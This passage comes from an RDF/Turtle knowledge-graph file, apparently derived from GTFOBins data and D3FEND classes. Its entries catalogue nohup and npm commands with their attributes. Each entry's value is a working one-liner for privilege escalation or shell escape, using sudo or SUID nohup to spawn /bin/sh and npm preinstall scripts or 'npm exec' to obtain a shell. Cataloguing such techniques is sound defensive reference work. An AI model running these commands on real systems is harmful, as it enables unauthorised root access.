    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nohup ;
    mknd:provides mknd:function_sudo ;
    mknd:value "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"" .

mknd:command_nohup-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nohup-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_nohup ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nohup ;
    mknd:provides mknd:function_suid ;
    mknd:value "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"" .

mknd:command_npm-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "npm-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`." ;
    d3f:uses mknd:executable_npm ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_npm ;
    mknd:provides mknd:function_shell ;
    mknd:value """TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
npm -C $TF i
""",
        "npm exec /bin/sh" .

mknd:command_npm-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "npm-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`." ;
    d3f:uses mknd:executable_npm ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_npm ;
    mknd:provides mknd:function_sudo ;
    mknd:value """TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
""" .

